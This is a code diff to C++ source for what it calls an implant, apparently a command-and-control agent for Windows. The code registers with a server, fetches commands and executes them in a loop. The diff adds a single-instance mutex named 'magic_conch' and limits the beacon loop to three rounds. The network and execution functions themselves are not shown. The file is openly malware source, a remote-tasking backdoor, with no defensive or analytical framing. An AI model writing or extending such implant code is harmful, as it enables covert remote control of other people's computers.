@@ -74,6 +74,7 @@ void executeCommands(std::vector<std::string> cmds) {
     }
 }
 
+// get commands from server and execute them
 void getTasksAndExecute() {
     json jsonPayload = {
         {"agent_id", agentId},
@@ -93,14 +94,30 @@ void getTasksAndExecute() {
 }
 
 int main(int argc, char* argv[]){
+
+    // use a mutex to prevent multiple instances of the implant
+    LPCSTR szUniqueNamedMutex = "magic_conch";
+    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
+    if( ERROR_ALREADY_EXISTS == GetLastError() )
+    {
+        // Program already running somewhere
+        return 0; // Exit program
+    }
+
     agentId = generateRandomId(10);
     registerAgent();
 
-    while(TRUE) {
+    int i = 3;
+    while(i > 0) {
         std::cout << "wake up" << std::endl;
         getTasksAndExecute();
         Sleep(sleepTime);
+        i--;
     }
+
+    // Upon app closing:
+    ReleaseMutex( hHandle ); // Explicitly release mutex
+    CloseHandle( hHandle ); // close handle before terminating
 
     return 0;
 }
